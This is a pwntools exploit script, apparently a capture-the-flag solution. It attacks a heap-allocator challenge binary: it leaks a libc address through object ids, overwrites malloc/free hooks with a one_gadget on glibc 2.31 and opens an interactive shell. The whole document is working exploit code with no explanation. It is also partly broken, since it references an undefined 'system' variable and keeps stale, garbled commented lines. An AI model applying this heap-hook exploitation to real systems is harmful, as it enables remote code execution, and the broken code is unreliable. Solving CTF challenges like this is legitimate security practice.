from pwn import *

context.terminal = ["guake", "--split-vertical", "-e"]

def alloc(size, content):
    r.sendline("1")
    r.recvuntil("size: ")
    r.sendline(f"{size}")
    r.recvuntil("Object id: ")
    try:
        oid = int(r.recvuntil("\n"))
    except:
        oid = 0
    r.sendline(content)
    return oid


def free(oid):
    r.sendline("2")
    r.sendline(f"{oid}")


r = process(["./ld.so","./heap"], env={"LD_PRELOAD": "./libc-2.31.so"})
# r = remote("yetanotherheap.hackable.software", 1337)

alloc(10, "A"*9)
alloc(20, "A"*19)
alloc(40, "A"*39)
free(1)
alloc(10, "A"*9) # chunk now has libc ptrs
oid = 0
bits = []
while oid <= 96:
    print(oid)
    oid = alloc(10, "A"*9)
    if oid >= 32:
        bits.append(oid)

libc_addr = ""
for i in range(95,31,-1):
    if i not in bits:
        libc_addr += "1"
    else:
        libc_addr += "0"
arena_addr = int(libc_addr,2) - 96
print(hex(arena_addr))

l = ELF("./libc-2.31.so")
main_arena_offset = 0x1ebb80
libc_start = arena_addr - main_arena_offset
free_hook = l.symbols["__free_hook"] + libc_start
one_gadget = 0xe6e73 + libc_start

print(hex(one_gadget))

free(193)
alloc(47, "A"*46)
alloc(420, "A"*419)

big_oid = alloc(2000, 'a'*2000)
free(big_oid - 1)
payload = p32(0x6000)
payload += p64(0xffffffffffffffff)
payload += p32(0x03ffffff)
payload += b'A'*(2000-len(payload))
alloc(2000, payload)
# gdb.attach(r)

def replace(idx, data):
    global s
    s = s[:idx] + p64(data) + s[idx+8:]

p_one_gadget = p64(one_gadget)
xor_r10_gadget = p64(libc_start + 0x0000000000142070)

s = b""
s = p_one_gadget*(0x200//8)
# s = cyclic(length=0x6000,n=8)
p_one_gadget = p64(one_gadget)
s = bytearray([0] * 0x6000)
s[6936:6936+8] = p64(system)

# assert(len(s) == 0x6000) += cyclic(length=0xe00,n=8)
# malloc_hook is 0xb60 from start of write area
# but some pointer at the top of memory get triggered first so w/e

# this writes into free_hook so r10 will be set to NULL on next free()
# xor_r10_gadget = p64(libc_start + 0x0000000000142070)
# s+= xor_r10_gadget*(0x5000//8)
replace(2912, 0)
replace(6008,libc_start + 0x169080)


alloc(0x5fff, s)

# this triggers a free and sets r10 to NULL
free(97)
free(193)
free(289)
r.sendline('1')
# this triggers malloc_hook, which is set to one_gadget
r.sendline('3000')
r.interactive()
